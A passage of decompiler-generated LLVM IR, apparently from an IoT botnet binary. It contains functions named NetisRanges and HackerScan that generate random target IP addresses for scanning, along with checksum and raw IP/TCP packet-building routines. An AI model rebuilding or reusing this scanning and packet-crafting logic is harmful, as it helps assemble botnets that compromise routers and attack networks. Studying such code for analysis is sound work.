  uselistorder label %dec_label_pc_100070cc, { 1, 0 }
  uselistorder label %dec_label_pc_10007078, { 1, 0 }
  uselistorder label %dec_label_pc_10007024, { 1, 0 }
  uselistorder label %dec_label_pc_10006fd0, { 1, 0 }
  uselistorder label %dec_label_pc_10006f7c, { 1, 0 }
  uselistorder label %dec_label_pc_10006f28, { 1, 0 }
  uselistorder label %dec_label_pc_10006ed4, { 1, 0 }
  uselistorder label %dec_label_pc_10006e80, { 1, 0 }
  uselistorder label %dec_label_pc_10006e2c, { 1, 0 }
  uselistorder label %dec_label_pc_10006dd8, { 1, 0 }
  uselistorder label %dec_label_pc_10006d84, { 1, 0 }
  uselistorder label %dec_label_pc_10006d30, { 1, 0 }
  uselistorder label %dec_label_pc_10006cdc, { 1, 0 }
  uselistorder label %dec_label_pc_10006c88, { 1, 0 }
  uselistorder label %dec_label_pc_10006c34, { 1, 0 }
  uselistorder label %dec_label_pc_10006be0, { 1, 0 }
  uselistorder label %dec_label_pc_10006b8c, { 1, 0 }
  uselistorder label %dec_label_pc_10006b38, { 1, 0 }
  uselistorder label %dec_label_pc_10006ae4, { 1, 0 }
  uselistorder label %dec_label_pc_10006a90, { 1, 0 }
  uselistorder label %dec_label_pc_10006a3c, { 1, 0 }
  uselistorder label %dec_label_pc_100069e8, { 1, 0 }
  uselistorder label %dec_label_pc_10006994, { 1, 0 }
  uselistorder label %dec_label_pc_10006940, { 1, 0 }
  uselistorder label %dec_label_pc_100068ec, { 1, 0 }
  uselistorder label %dec_label_pc_10006898, { 1, 0 }
  uselistorder label %dec_label_pc_10006844, { 1, 0 }
  uselistorder label %dec_label_pc_100067f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000679c, { 1, 0 }
  uselistorder label %dec_label_pc_10006748, { 1, 0 }
  uselistorder label %dec_label_pc_100066f4, { 1, 0 }
  uselistorder label %dec_label_pc_100066a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000664c, { 1, 0 }
  uselistorder label %dec_label_pc_100065f8, { 1, 0 }
  uselistorder label %dec_label_pc_100065a4, { 1, 0 }
  uselistorder label %dec_label_pc_10006550, { 1, 0 }
  uselistorder label %dec_label_pc_100064fc, { 1, 0 }
  uselistorder label %dec_label_pc_100064a8, { 1, 0 }
  uselistorder label %dec_label_pc_10006454, { 1, 0 }
  uselistorder label %dec_label_pc_10006400, { 1, 0 }
  uselistorder label %dec_label_pc_100063ac, { 1, 0 }
  uselistorder label %dec_label_pc_10006358, { 1, 0 }
  uselistorder label %dec_label_pc_10006304, { 1, 0 }
  uselistorder label %dec_label_pc_100062b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000625c, { 1, 0 }
  uselistorder label %dec_label_pc_10006208, { 1, 0 }
  uselistorder label %dec_label_pc_100061b4, { 1, 0 }
  uselistorder label %dec_label_pc_10006160, { 1, 0 }
  uselistorder label %dec_label_pc_1000610c, { 1, 0 }
  uselistorder label %dec_label_pc_100060b8, { 1, 0 }
  uselistorder label %dec_label_pc_10006064, { 1, 0 }
  uselistorder label %dec_label_pc_10006010, { 1, 0 }
  uselistorder label %dec_label_pc_10005fbc, { 1, 0 }
  uselistorder label %dec_label_pc_10005f68, { 1, 0 }
  uselistorder label %dec_label_pc_10005f14, { 1, 0 }
  uselistorder label %dec_label_pc_10005ec0, { 1, 0 }
  uselistorder label %dec_label_pc_10005e6c, { 1, 0 }
  uselistorder label %dec_label_pc_10005e18, { 1, 0 }
  uselistorder label %dec_label_pc_10005dc4, { 1, 0 }
  uselistorder label %dec_label_pc_10005d70, { 1, 0 }
  uselistorder label %dec_label_pc_10005d1c, { 1, 0 }
  uselistorder label %dec_label_pc_10005cc8, { 1, 0 }
  uselistorder label %dec_label_pc_10005c74, { 1, 0 }
  uselistorder label %dec_label_pc_10005c20, { 1, 0 }
  uselistorder label %dec_label_pc_10005bcc, { 1, 0 }
  uselistorder label %dec_label_pc_10005b78, { 1, 0 }
  uselistorder label %dec_label_pc_10005b24, { 1, 0 }
  uselistorder label %dec_label_pc_10005ad0, { 1, 0 }
  uselistorder label %dec_label_pc_10005a7c, { 1, 0 }
  uselistorder label %dec_label_pc_10005a28, { 1, 0 }
  uselistorder label %dec_label_pc_100059d4, { 1, 0 }
  uselistorder label %dec_label_pc_10005980, { 1, 0 }
  uselistorder label %dec_label_pc_1000592c, { 1, 0 }
  uselistorder label %dec_label_pc_100058d8, { 1, 0 }
  uselistorder label %dec_label_pc_10005884, { 1, 0 }
  uselistorder label %dec_label_pc_10005830, { 1, 0 }
  uselistorder label %dec_label_pc_100057dc, { 1, 0 }
  uselistorder label %dec_label_pc_10005788, { 1, 0 }
  uselistorder label %dec_label_pc_10005734, { 1, 0 }
  uselistorder label %dec_label_pc_100056e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000568c, { 1, 0 }
  uselistorder label %dec_label_pc_10005638, { 1, 0 }
  uselistorder label %dec_label_pc_100055e4, { 1, 0 }
  uselistorder label %dec_label_pc_10005590, { 1, 0 }
  uselistorder label %dec_label_pc_1000553c, { 1, 0 }
  uselistorder label %dec_label_pc_100054e8, { 1, 0 }
  uselistorder label %dec_label_pc_10005494, { 1, 0 }
  uselistorder label %dec_label_pc_10005440, { 1, 0 }
  uselistorder label %dec_label_pc_100053ec, { 1, 0 }
  uselistorder label %dec_label_pc_10005398, { 1, 0 }
  uselistorder label %dec_label_pc_10005344, { 1, 0 }
  uselistorder label %dec_label_pc_100052f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000529c, { 1, 0 }
  uselistorder label %dec_label_pc_10005248, { 1, 0 }
  uselistorder label %dec_label_pc_100051f4, { 1, 0 }
  uselistorder label %dec_label_pc_100051a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000514c, { 1, 0 }
  uselistorder label %dec_label_pc_100050f8, { 1, 0 }
  uselistorder label %dec_label_pc_100050a4, { 1, 0 }
  uselistorder label %dec_label_pc_10005050, { 1, 0 }
  uselistorder label %dec_label_pc_10004ffc, { 1, 0 }
  uselistorder label %dec_label_pc_10004fa8, { 1, 0 }
  uselistorder label %dec_label_pc_10004f54, { 1, 0 }
  uselistorder label %dec_label_pc_10004f00, { 1, 0 }
  uselistorder label %dec_label_pc_10004eac, { 1, 0 }
  uselistorder label %dec_label_pc_10004e58, { 1, 0 }
  uselistorder label %dec_label_pc_10004e04, { 1, 0 }
  uselistorder label %dec_label_pc_10004db0, { 1, 0 }
  uselistorder label %dec_label_pc_10004d5c, { 1, 0 }
  uselistorder label %dec_label_pc_10004d08, { 1, 0 }
  uselistorder label %dec_label_pc_10004cb4, { 1, 0 }
  uselistorder label %dec_label_pc_10004c60, { 1, 0 }
  uselistorder label %dec_label_pc_10004c0c, { 1, 0 }
  uselistorder label %dec_label_pc_10004bb8, { 1, 0 }
  uselistorder label %dec_label_pc_10004b64, { 1, 0 }
  uselistorder label %dec_label_pc_10004b10, { 1, 0 }
  uselistorder label %dec_label_pc_10004abc, { 1, 0 }
  uselistorder label %dec_label_pc_10004a68, { 1, 0 }
  uselistorder label %dec_label_pc_10004a14, { 1, 0 }
  uselistorder label %dec_label_pc_100049c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000496c, { 1, 0 }
  uselistorder label %dec_label_pc_10004918, { 1, 0 }
  uselistorder label %dec_label_pc_100048c4, { 1, 0 }
  uselistorder label %dec_label_pc_10004870, { 1, 0 }
  uselistorder label %dec_label_pc_1000481c, { 1, 0 }
  uselistorder label %dec_label_pc_100047c8, { 1, 0 }
  uselistorder label %dec_label_pc_10004774, { 1, 0 }
  uselistorder label %dec_label_pc_10004720, { 1, 0 }
  uselistorder label %dec_label_pc_100046cc, { 1, 0 }
  uselistorder label %dec_label_pc_10004678, { 1, 0 }
  uselistorder label %dec_label_pc_10004624, { 1, 0 }
  uselistorder label %dec_label_pc_100045d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000457c, { 1, 0 }
  uselistorder label %dec_label_pc_10004528, { 1, 0 }
  uselistorder label %dec_label_pc_100044d4, { 1, 0 }
  uselistorder label %dec_label_pc_10004480, { 1, 0 }
  uselistorder label %dec_label_pc_1000442c, { 1, 0 }
  uselistorder label %dec_label_pc_100043d8, { 1, 0 }
  uselistorder label %dec_label_pc_10004384, { 1, 0 }
  uselistorder label %dec_label_pc_10004330, { 1, 0 }
  uselistorder label %dec_label_pc_100042dc, { 1, 0 }
  uselistorder label %dec_label_pc_10004288, { 1, 0 }
  uselistorder label %dec_label_pc_10004234, { 1, 0 }
  uselistorder label %dec_label_pc_100041e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000418c, { 1, 0 }
  uselistorder label %dec_label_pc_10004138, { 1, 0 }
  uselistorder label %dec_label_pc_100040e4, { 1, 0 }
  uselistorder label %dec_label_pc_10004090, { 1, 0 }
  uselistorder label %dec_label_pc_1000403c, { 1, 0 }
  uselistorder label %dec_label_pc_10003fe8, { 1, 0 }
  uselistorder label %dec_label_pc_10003f94, { 1, 0 }
  uselistorder label %dec_label_pc_10003f40, { 1, 0 }
  uselistorder label %dec_label_pc_10003eec, { 1, 0 }
  uselistorder label %dec_label_pc_10003e98, { 1, 0 }
  uselistorder label %dec_label_pc_10003e44, { 1, 0 }
  uselistorder label %dec_label_pc_10003df0, { 1, 0 }
  uselistorder label %dec_label_pc_10003d9c, { 1, 0 }
  uselistorder label %dec_label_pc_10003d48, { 1, 0 }
  uselistorder label %dec_label_pc_10003cf4, { 1, 0 }
  uselistorder label %dec_label_pc_10003ca0, { 1, 0 }
  uselistorder label %dec_label_pc_10003c4c, { 1, 0 }
  uselistorder label %dec_label_pc_10003bf8, { 1, 0 }
  uselistorder label %dec_label_pc_10003ba4, { 1, 0 }
  uselistorder label %dec_label_pc_10003b50, { 1, 0 }
  uselistorder label %dec_label_pc_10003afc, { 1, 0 }
  uselistorder label %dec_label_pc_10003aa8, { 1, 0 }
  uselistorder label %dec_label_pc_10003a54, { 1, 0 }
  uselistorder label %dec_label_pc_10003a00, { 1, 0 }
  uselistorder label %dec_label_pc_100039ac, { 1, 0 }
  uselistorder label %dec_label_pc_10003958, { 1, 0 }
  uselistorder label %dec_label_pc_10003904, { 1, 0 }
  uselistorder label %dec_label_pc_100038b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000385c, { 1, 0 }
  uselistorder label %dec_label_pc_10003808, { 1, 0 }
  uselistorder label %dec_label_pc_100037b4, { 1, 0 }
  uselistorder label %dec_label_pc_10003760, { 1, 0 }
  uselistorder label %dec_label_pc_1000370c, { 1, 0 }
  uselistorder label %dec_label_pc_100036b8, { 1, 0 }
  uselistorder label %dec_label_pc_10003664, { 1, 0 }
  uselistorder label %dec_label_pc_10003610, { 1, 0 }
  uselistorder label %dec_label_pc_100035bc, { 1, 0 }
  uselistorder label %dec_label_pc_10003568, { 1, 0 }
  uselistorder label %dec_label_pc_10003514, { 1, 0 }
  uselistorder label %dec_label_pc_100034c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000346c, { 1, 0 }
  uselistorder label %dec_label_pc_10003418, { 1, 0 }
  uselistorder label %dec_label_pc_100033c4, { 1, 0 }
  uselistorder label %dec_label_pc_10003370, { 1, 0 }
  uselistorder label %dec_label_pc_1000331c, { 1, 0 }
  uselistorder label %dec_label_pc_100032c8, { 1, 0 }
  uselistorder label %dec_label_pc_10003274, { 1, 0 }
  uselistorder label %dec_label_pc_10003220, { 1, 0 }
  uselistorder label %dec_label_pc_100031cc, { 1, 0 }
  uselistorder label %dec_label_pc_10003178, { 1, 0 }
  uselistorder label %dec_label_pc_10003124, { 1, 0 }
  uselistorder label %dec_label_pc_100030d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000307c, { 1, 0 }
  uselistorder label %dec_label_pc_10003028, { 1, 0 }
  uselistorder label %dec_label_pc_10002fd4, { 1, 0 }
  uselistorder label %dec_label_pc_10002f80, { 1, 0 }
}

define i32 @NetisRanges() local_unnamed_addr {
entry:
  %stack_var_-52 = alloca i32, align 4
  store i32 268465156, i32* @lr, align 4
  %v0_10007400 = call i32 @random()
  %v1_10007424 = urem i32 %v0_10007400, 57
  %v1_10007450 = mul nuw nsw i32 %v1_10007424, 4
  %v2_10007454 = add i32 %v1_10007450, ptrtoint (i32* @global_var_1002a74c.246 to i32)
  %v1_10007458 = inttoptr i32 %v2_10007454 to i32*
  %v2_10007458 = load i32, i32* %v1_10007458, align 4
  %v1_10007468 = trunc i32 %v2_10007458 to i8
  store i8 %v1_10007468, i8* @global_var_1002abc1.44, align 1
  store i32 268465264, i32* @lr, align 4
  %v0_1000746c = call i32 @random()
  %v2_1000748c = srem i32 %v0_1000746c, 255
  %v1_100074b4 = trunc i32 %v2_1000748c to i8
  store i8 %v1_100074b4, i8* @global_var_1002abc2.45, align 1
  store i32 268465340, i32* @lr, align 4
  %v0_100074b8 = call i32 @random()
  %v2_100074d8 = srem i32 %v0_100074b8, 255
  %v1_10007500 = trunc i32 %v2_100074d8 to i8
  store i8 %v1_10007500, i8* @global_var_1002abc3.46, align 1
  store i32 268465416, i32* @lr, align 4
  %v0_10007504 = call i32 @random()
  %v2_10007514 = sext i32 %v0_10007504 to i64
  %v4_10007514 = mul nsw i64 %v2_10007514, -2139062143
  %v5_10007514 = udiv i64 %v4_10007514, 4294967296
  %v6_10007514 = trunc i64 %v5_10007514 to i32
  %v2_10007518 = add i32 %v6_10007514, %v0_10007504
  %v1_1000751c = udiv i32 %v2_10007518, 128
  %tmp = icmp slt i32 %v0_10007504, 0
  %v1_10007520 = zext i1 %tmp to i32
  %v2_10007520 = ashr i32 %v0_10007504, 31
  %v3_10007520 = and i32 %v2_10007520, -2
  %v4_10007520 = or i32 %v3_10007520, %v1_10007520
  %v2_10007524 = sub nsw i32 %v1_1000751c, %v4_10007520
  %tmp16 = mul i32 %v2_10007524, -255
  %v2_10007534 = add i32 %tmp16, %v0_10007504
  %v1_1000754c = trunc i32 %v2_10007534 to i8
  store i8 %v1_1000754c, i8* @global_var_1002abc4.47, align 1
  store i32 0, i32* %stack_var_-52, align 4
  %v2_10007570 = ptrtoint i32* %stack_var_-52 to i32
  %v2_10007584 = load i8, i8* bitcast (i8** @global_var_1002abc0.43 to i8*), align 4
  %v3_10007584 = zext i8 %v2_10007584 to i32
  %v4_100075e0 = call i32 @szprintf(i32 %v2_10007570, i32 ptrtoint ([12 x i8]* @global_var_10016f34.247 to i32), i32 %v3_10007584)
  store i32 268465648, i32* @lr, align 4
  %v1_100075ec = call i32 @inet_addr(i32 %v2_10007570)
  ret i32 %v1_100075ec

; uselistorder directives
  uselistorder i32 %v2_10007570, { 1, 0 }
  uselistorder i32 %v0_10007504, { 1, 3, 0, 2, 4 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i8* @global_var_1002abc4.47, { 2, 1, 0 }
  uselistorder i8* @global_var_1002abc3.46, { 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_1002abc2.45, { 2, 1, 0 }
  uselistorder i8* @global_var_1002abc1.44, { 2, 1, 0 }
  uselistorder i32 110, { 1, 0 }
}

define i32 @HackerScan(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000762c = load i32, i32* @global_var_1002abd0.248, align 4
  store i32 %v3_1000762c, i32* @r3, align 4
  %v2_10007634 = call i32 @ntohl(i32 %v3_1000762c, i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  %v2_10007640 = and i32 %v2_10007634, %arg1
  %v0_10007648 = call i32 @rand_cmwc()
  %v1_10007654 = sub i32 -1, %arg1
  %v2_10007658 = and i32 %v0_10007648, %v1_10007654
  %v2_10007660 = xor i32 %v2_10007658, %v2_10007640
  ret i32 %v2_10007660
}

define i32 @csum(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp21 = call i16 @__decompiler_undefined_function_4()
  %v2_100076f03 = icmp sgt i32 %arg2, 1
  br i1 %v2_100076f03, label %dec_label_pc_100076a8, label %dec_label_pc_100076f8

dec_label_pc_100076a8:                            ; preds = %entry, %dec_label_pc_100076a8
  %stack_var_-24.08 = phi i16* [ %v5_100076dc, %dec_label_pc_100076a8 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v1_100076e4, %dec_label_pc_100076a8 ], [ %arg2, %entry ]
  %stack_var_-16.06 = phi i32 [ %v5_100076c8, %dec_label_pc_100076a8 ], [ 0, %entry ]
  %stack_var_-12.05 = phi i32 [ %v2_100076c4, %dec_label_pc_100076a8 ], [ 0, %entry ]
  %v4_100076a8 = ptrtoint i16* %stack_var_-24.08 to i32
  %v2_100076ac = load i16, i16* %stack_var_-24.08, align 2
  %v3_100076ac = zext i16 %v2_100076ac to i32
  %v2_100076c4 = add i32 %v3_100076ac, %stack_var_-12.05
  %v3_100076c4 = icmp ult i32 %v2_100076c4, %stack_var_-12.05
  %v4_100076c8 = zext i1 %v3_100076c4 to i32
  %v5_100076c8 = add i32 %v4_100076c8, %stack_var_-16.06
  %v1_100076d8 = add i32 %v4_100076a8, 2
  %v5_100076dc = inttoptr i32 %v1_100076d8 to i16*
  %v1_100076e4 = add nsw i32 %stack_var_-20.07, -2
  %v2_100076f0 = icmp sgt i32 %v1_100076e4, 1
  br i1 %v2_100076f0, label %dec_label_pc_100076a8, label %dec_label_pc_100076ec.dec_label_pc_100076f8_crit_edge

dec_label_pc_100076ec.dec_label_pc_100076f8_crit_edge: ; preds = %dec_label_pc_100076a8
  %v3_100076f0.le = icmp eq i32 %v1_100076e4, 1
  br i1 %v3_100076f0.le, label %dec_label_pc_10007704, label %dec_label_pc_10007770.preheader

dec_label_pc_100076f8:                            ; preds = %entry
  %v3_100076f04 = icmp eq i32 %arg2, 1
  br i1 %v3_100076f04, label %dec_label_pc_10007704, label %dec_label_pc_10007770.preheader

dec_label_pc_10007704:                            ; preds = %dec_label_pc_100076ec.dec_label_pc_100076f8_crit_edge, %dec_label_pc_100076f8
  %stack_var_-24.0.lcssa20 = phi i16* [ %v5_100076dc, %dec_label_pc_100076ec.dec_label_pc_100076f8_crit_edge ], [ %arg1, %dec_label_pc_100076f8 ]
  %stack_var_-16.0.lcssa19 = phi i32 [ %v5_100076c8, %dec_label_pc_100076ec.dec_label_pc_100076f8_crit_edge ], [ 0, %dec_label_pc_100076f8 ]
  %stack_var_-12.0.lcssa18 = phi i32 [ %v2_100076c4, %dec_label_pc_100076ec.dec_label_pc_100076f8_crit_edge ], [ 0, %dec_label_pc_100076f8 ]
  %v1_10007708 = bitcast i16* %stack_var_-24.0.lcssa20 to i8*
  %v2_10007708 = load i8, i8* %v1_10007708, align 1
  %v3_10007708 = zext i8 %v2_10007708 to i32
  %v2_10007720 = add i32 %v3_10007708, %stack_var_-12.0.lcssa18
  %v3_10007720 = icmp ult i32 %v2_10007720, %stack_var_-12.0.lcssa18
  %v4_10007724 = zext i1 %v3_10007720 to i32
  %v5_10007724 = add i32 %v4_10007724, %stack_var_-16.0.lcssa19
  br label %dec_label_pc_10007770.preheader

dec_label_pc_10007770.preheader:                  ; preds = %dec_label_pc_100076ec.dec_label_pc_100076f8_crit_edge, %dec_label_pc_10007704, %dec_label_pc_100076f8
  %stack_var_-12.1.ph = phi i32 [ %v2_100076c4, %dec_label_pc_100076ec.dec_label_pc_100076f8_crit_edge ], [ 0, %dec_label_pc_100076f8 ], [ %v2_10007720, %dec_label_pc_10007704 ]
  %stack_var_-16.1.ph = phi i32 [ %v5_100076c8, %dec_label_pc_100076ec.dec_label_pc_100076f8_crit_edge ], [ 0, %dec_label_pc_100076f8 ], [ %v5_10007724, %dec_label_pc_10007704 ]
  %v1_1000777429 = mul i32 %stack_var_-16.1.ph, 65536
  %v1_1000777c30 = udiv i32 %stack_var_-12.1.ph, 65536
  %v2_1000778031 = or i32 %v1_1000777429, %v1_1000777c30
  %v1_1000778832 = udiv i32 %stack_var_-16.1.ph, 65536
  %v2_1000779033 = or i32 %v2_1000778031, %v1_1000778832
  %v3_1000779434 = icmp eq i32 %v2_1000779033, 0
  br i1 %v3_1000779434, label %dec_label_pc_1000779c, label %dec_label_pc_10007734

dec_label_pc_10007734:                            ; preds = %dec_label_pc_10007770.preheader, %dec_label_pc_10007734
  %v1_1000778837 = phi i32 [ %v1_10007788, %dec_label_pc_10007734 ], [ %v1_1000778832, %dec_label_pc_10007770.preheader ]
  %v2_1000778036 = phi i32 [ %v2_10007780, %dec_label_pc_10007734 ], [ %v2_1000778031, %dec_label_pc_10007770.preheader ]
  %stack_var_-12.135 = phi i32 [ %v2_10007760, %dec_label_pc_10007734 ], [ %stack_var_-12.1.ph, %dec_label_pc_10007770.preheader ]
  %v1_10007740 = urem i32 %stack_var_-12.135, 65536
  %v2_10007760 = add i32 %v2_1000778036, %v1_10007740
  %v3_10007760 = icmp ult i32 %v2_10007760, %v1_10007740
  %v4_10007764 = zext i1 %v3_10007760 to i32
  %v5_10007764 = add nuw nsw i32 %v4_10007764, %v1_1000778837
  %v1_10007774 = mul i32 %v5_10007764, 65536
  %v1_1000777c = udiv i32 %v2_10007760, 65536
  %v2_10007780 = or i32 %v1_10007774, %v1_1000777c
  %v1_10007788 = udiv i32 %v5_10007764, 65536
  %v2_10007790 = or i32 %v2_10007780, %v1_10007788
  %v3_10007794 = icmp eq i32 %v2_10007790, 0
  br i1 %v3_10007794, label %dec_label_pc_10007770.dec_label_pc_1000779c_crit_edge, label %dec_label_pc_10007734

dec_label_pc_10007770.dec_label_pc_1000779c_crit_edge: ; preds = %dec_label_pc_10007734
  br label %dec_label_pc_1000779c

dec_label_pc_1000779c:                            ; preds = %dec_label_pc_10007770.dec_label_pc_1000779c_crit_edge, %dec_label_pc_10007770.preheader
  %v4_1000779c = zext i16 %tmp21 to i32
  %v1_100077a8 = xor i32 %v4_1000779c, 65535
  ret i32 %v1_100077a8

; uselistorder directives
  uselistorder i32 %v2_10007780, { 1, 0 }
  uselistorder i32 %v5_10007764, { 1, 0 }
  uselistorder i32 %v2_10007760, { 0, 2, 1 }
  uselistorder i32 %v1_1000778832, { 1, 0 }
  uselistorder i32 %stack_var_-16.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa18, { 1, 0 }
  uselistorder i32 %v1_100076e4, { 0, 2, 1 }
  uselistorder i32 %v2_100076c4, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-12.05, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007734, { 1, 0 }
  uselistorder label %dec_label_pc_10007770.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10007704, { 1, 0 }
  uselistorder label %dec_label_pc_100076a8, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100077c0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100077c0, i32* %stack_var_-64, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_100077ec = add i32 %arg1, 12
  %v2_100077ec = inttoptr i32 %v1_100077ec to i32*
  %v3_100077ec = load i32, i32* %v2_100077ec, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_100077f8 = add i32 %arg1, 16
  %v2_100077f8 = inttoptr i32 %v1_100077f8 to i32*
  %v3_100077f8 = load i32, i32* %v2_100077f8, align 4
  store i32 20, i32* @r3, align 4
  %v1_10007814 = call i32 @htons(i32 20)
  store i32 268466228, i32* @lr, align 4
  %v1_10007830 = call i32 @malloc(i32 32)
  store i32 %v1_10007830, i32* %r11.global-to-local, align 4
  store i32 %v3_100077f8, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10007850 = inttoptr i32 %v1_10007830 to i32*
  store i32 %v3_100077ec, i32* %v2_10007850, align 4
  %v0_10007854 = load i32, i32* %r10.global-to-local, align 4
  %v1_10007854 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007854 = add i32 %v1_10007854, 4
  %v3_10007854 = inttoptr i32 %v2_10007854 to i32*
  store i32 %v0_10007854, i32* %v3_10007854, align 4
  %v0_10007858 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007858 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007858 = add i32 %v1_10007858, 8
  %v3_10007858 = inttoptr i32 %v2_10007858 to i32*
  store i32 %v0_10007858, i32* %v3_10007858, align 4
  %v1_10007860 = add i32 %v1_10007830, 12
  store i32 %v1_10007860, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_10007868 = load i32, i32* %arg2, align 4
  %v1_1000786c = add i32 %tmp, 4
  %v2_1000786c = inttoptr i32 %v1_1000786c to i32*
  %v3_1000786c = load i32, i32* %v2_1000786c, align 4
  store i32 %v3_1000786c, i32* %r10.global-to-local, align 4
  %v1_10007870 = add i32 %tmp, 8
  %v2_10007870 = inttoptr i32 %v1_10007870 to i32*
  %v3_10007870 = load i32, i32* %v2_10007870, align 4
  %v1_10007874 = add i32 %tmp, 12
  %v2_10007874 = inttoptr i32 %v1_10007874 to i32*
  %v3_10007874 = load i32, i32* %v2_10007874, align 4
  %v2_10007878 = inttoptr i32 %v1_10007860 to i32*
  store i32 %v2_10007868, i32* %v2_10007878, align 4
  %v0_1000787c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000787c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000787c = add i32 %v1_1000787c, 4
  %v3_1000787c = inttoptr i32 %v2_1000787c to i32*
  store i32 %v0_1000787c, i32* %v3_1000787c, align 4
  %v1_10007880 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007880 = add i32 %v1_10007880, 8
  %v3_10007880 = inttoptr i32 %v2_10007880 to i32*
  store i32 %v3_10007870, i32* %v3_10007880, align 4
  %v1_10007884 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007884 = add i32 %v1_10007884, 12
  %v3_10007884 = inttoptr i32 %v2_10007884 to i32*
  store i32 %v3_10007874, i32* %v3_10007884, align 4
  %v1_10007888 = add i32 %tmp, 16
  %v2_10007888 = inttoptr i32 %v1_10007888 to i32*
  %v3_10007888 = load i32, i32* %v2_10007888, align 4
  %v1_1000788c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000788c = add i32 %v1_1000788c, 16
  %v3_1000788c = inttoptr i32 %v2_1000788c to i32*
  store i32 %v3_10007888, i32* %v3_1000788c, align 4
  %v5_10007898 = inttoptr i32 %v1_10007830 to i16*
  %v6_10007898 = call i32 @csum(i16* %v5_10007898, i32 32, i32 %v3_10007874, i32 %v3_10007870, i32 %tmp)
  %sext = mul i32 %v6_10007898, 65536
  %v1_1000789c = sdiv i32 %sext, 65536
  store i32 268466348, i32* @lr, align 4
  %v1_100078a8 = call i32 @free(i32 %v1_10007830)
  %v1_100078b0 = urem i32 %v1_1000789c, 65536
  %v2_100078b8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_100078b8, i32* %r11.global-to-local, align 4
  ret i32 %v1_100078b0

; uselistorder directives
  uselistorder i32 %v1_10007830, { 3, 2, 1, 0, 4 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8 }
}

define i32 @makeIPPacket(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_10007908 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10007908, i32* %arg1, align 4
  %v1_1000791c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_1000791c, i32* %arg1, align 4
  %v3_1000792c = add i32 %tmp1, 1
  %v4_1000792c = inttoptr i32 %v3_1000792c to i8*
  store i8 0, i8* %v4_1000792c, align 1
  %fold = add i32 %arg5, 20
  %v1_10007944 = trunc i32 %fold to i16
  %v3_10007944 = add i32 %tmp1, 2
  %v4_10007944 = inttoptr i32 %v3_10007944 to i16*
  store i16 %v1_10007944, i16* %v4_10007944, align 2
